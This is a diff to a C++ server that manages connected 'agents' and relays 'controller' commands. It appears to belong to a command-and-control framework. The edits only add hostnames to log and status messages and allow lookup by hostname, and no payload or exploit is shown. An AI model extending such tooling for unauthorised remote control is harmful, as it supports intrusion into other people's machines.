@@ -143,7 +143,7 @@ VOID Server::CheckForAgentConnections()
             bIsConnectionAlive = conn->ReceiveData(szData);
 
             if (!bIsConnectionAlive) {
-                std::cout << "[-] Disconnected from " << conn->GetSocketStr() << "\n";
+                std::cout << "[-] Disconnected from IP: " << conn->GetSocketStr() << " | Host: " << conn->GetHostNameSessionStr() << "\n";
                 connectionsIterator = RemoveAgentConnection(connectionsIterator);
             }
             else {
@@ -252,10 +252,10 @@ VOID Server::HandleControllerCommand(std::string szData, ControllerConnection* c
         bIsCommandSuccess = CloseConnection(controllerCommand.GetTargetAgent());
 
         if (bIsCommandSuccess) {
-            szResponse = "[*] Successfully closed connection with " + conn->GetSocketStr() + "\n";
+            szResponse = "[*] Successfully closed connection with " + controllerCommand.GetTargetAgent() + "\n";
         }
         else {
-            szResponse = "[!] Error closing connection with " + conn->GetSocketStr() + "\n";
+            szResponse = "[!] Error closing connection with " + controllerCommand.GetTargetAgent() + "\n";
         }
         break;
 
@@ -386,7 +386,7 @@ std::string Server::GetActiveAgentSockets() {
         szResult = "[+] Active sockets:\n";
 
         for (AgentConnection* conn : arrAgentConnections) {
-            szResult += "[+] Connected to " + conn->GetSocketStr() + "\n";
+            szResult += "[+] Connected to IP: " + conn->GetSocketStr() + " | Host: " + conn->GetHostNameSessionStr() + "\n";
         }
     }
 
@@ -400,7 +400,7 @@ std::vector<AgentConnection*>::iterator Server::FindConnectionFromSocketStr(std:
     for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
         AgentConnection* conn = *connectionsIterator;
 
-        if (conn->GetSocketStr() == szSocket) {
+        if (conn->GetSocketStr() == szSocket || conn->GetHostNameSessionStr() == szSocket) {
             return connectionsIterator;
         }
 
